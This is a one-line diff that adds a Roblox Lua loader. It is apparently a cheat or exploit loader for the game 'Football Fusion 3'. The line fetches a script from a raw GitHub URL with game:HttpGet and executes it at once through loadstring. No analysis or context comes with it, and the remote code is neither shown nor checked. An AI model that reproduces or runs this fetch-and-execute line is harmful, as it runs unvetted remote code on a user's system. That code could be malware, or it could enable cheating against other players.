@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/football-fusion-3-spam1-1fno91bko27gvb.lua"))()
